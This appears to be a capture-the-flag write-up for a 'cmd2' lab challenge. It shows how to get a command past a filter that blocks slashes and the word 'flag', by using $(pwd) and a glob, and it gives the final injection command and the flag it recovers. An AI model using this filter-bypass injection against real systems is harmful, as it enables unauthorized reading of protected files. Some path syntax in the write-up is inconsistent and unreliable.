# Pwnable - CMD2

## Understanding the code
Firstly, we can see that the program deletes all the environemnt variables, which means we cannot use 'cat' (for example), without specifing its full path (/bin/cat).

Then, we can see that the program filters a lot of useful strings - espiceally `/`!

## Trying to overcome filtering

Although we can't use PATH, we can still use `pwd`!

The program filters any slashes, that we use for paths - maybe we can overcome that using `pwd`.
Since we can't append to the pwd, the pwd needs to be common for every file on the server - which means we have to execute from the root folder.

When we run from the root folder, `pwd` will return `/` - which the program filtered!!!

## COnstructing the command

So, normally, our command would be:

`cd ..\..`
`cat \home\cmd2\flag`

So to avoid using `\`, we can wither use the `pwd`, or split the `cd` into 2 `cd` commands:

`cd ..`
`cd ..`
`cat \home\cmd2\flag`

Great :)

Now, we need to convert all the paths to use `pwd`. I wasn't sure on the syntax, so I used this. 
Then, we get:

`cd ..`
`cd ..`
`"$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)flag"`

We have one problem left - We cant use `flag`, the program filters it. 
So, we'll use the syntax `fla*`, which applies to all files that start with `fla` ;)

Finally, the full command we execute is:

`./tmp/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*'`

And... We get this:

`FuN_w1th_5h3ll_v4riabl3s_haha`

Haha :)